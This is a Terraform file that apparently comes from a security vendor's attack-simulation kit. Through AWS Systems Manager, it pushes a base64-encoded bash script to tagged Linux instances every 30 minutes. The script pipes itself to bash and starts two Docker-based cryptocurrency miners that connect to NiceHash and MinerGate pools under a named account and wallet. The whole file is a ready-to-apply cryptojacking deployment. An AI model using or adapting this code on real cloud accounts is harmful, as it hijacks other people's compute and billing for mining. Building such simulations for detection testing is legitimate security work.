locals {
    nicehash_image = "a2ncer/nheqminer_cpu:latest"
    nicehash_name = "nicehash"
    nicehash_server = "equihash.usa.nicehash.com:3357"
    nicehash_user="foxbones@protonmail.com"
    minergate_name = "minerd"
    minergate_image = "mkell43/minerd"
    minergate_server = "stratum+tcp://eth.pool.minergate.com:45791"
    minergate_user="3HotyetPPdD6pyGWtZvmMHLcXxmNuWR53C.worker1"

    payload = <<-EOT
    LOGFILE=/tmp/attacker_exec_docker_cpuminer.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    truncate -s 0 $LOGFILE
    log "Checking for docker..."
    while ! which docker; do
        log "docker not found - waiting"
        sleep 10
    done
    log "docker path: $(which docker)"
    if [[ `sudo docker ps | grep ${local.nicehash_name}` ]]; then docker stop ${local.nicehash_name}; fi
    sudo docker run --rm -d --network=host --name ${local.nicehash_name} ${local.nicehash_image} -l ${local.nicehash_server} -u ${local.nicehash_user}
    if [[ `sudo docker ps | grep ${local.minergate_name}` ]]; then docker stop ${local.minergate_name}; fi
    sudo docker run --rm -d --network=host --name ${local.minergate_name} ${local.minergate_image} -a cryptonight -o ${local.minergate_server} -u ${ local.minergate_user } -p x
    sudo docker ps -a >> $LOGFILE 2>&1
    log "done"
    EOT
    base64_payload = base64encode(local.payload)
}

resource "aws_ssm_document" "exec_docker_cpuminer" {
  name          = "exec_docker_cpuminer"
  document_type = "Command"

  content = jsonencode(
    {
        "schemaVersion": "2.2",
        "description": "start docker based cpuminer",
        "mainSteps": [
            {
                "action": "aws:runShellScript",
                "name": "exec_docker_cpuminer",
                "precondition": {
                    "StringEquals": [
                        "platformType",
                        "Linux"
                    ]
                },
                "inputs": {
                    "timeoutSeconds": "60",
                    "runCommand": [
                        "echo \"${local.base64_payload}\" > /tmp/payload_${basename(abspath(path.module))}",
                        "echo '${local.base64_payload}' | base64 -d | /bin/bash -"
                    ]
                }
            }
        ]
    })
}

resource "aws_resourcegroups_group" "exec_docker_cpuminer" {
    name = "exec_docker_cpuminer"

    resource_query {
        query = jsonencode(var.resource_query_exec_docker_cpuminer)
    }

    tags = {
        billing = var.environment
        owner   = "lacework"
    }
}

resource "aws_ssm_association" "exec_docker_cpuminer" {
    association_name = "exec_docker_cpuminer"

    name = aws_ssm_document.exec_docker_cpuminer.name

    targets {
        key = "resource-groups:Name"
        values = [
            aws_resourcegroups_group.exec_docker_cpuminer.name,
        ]
    }

    compliance_severity = "HIGH"

    # every 30 minutes
    schedule_expression = "cron(0/30 * * * ? *)"
    
    # will apply when updated and interval when false
    apply_only_at_cron_interval = false
}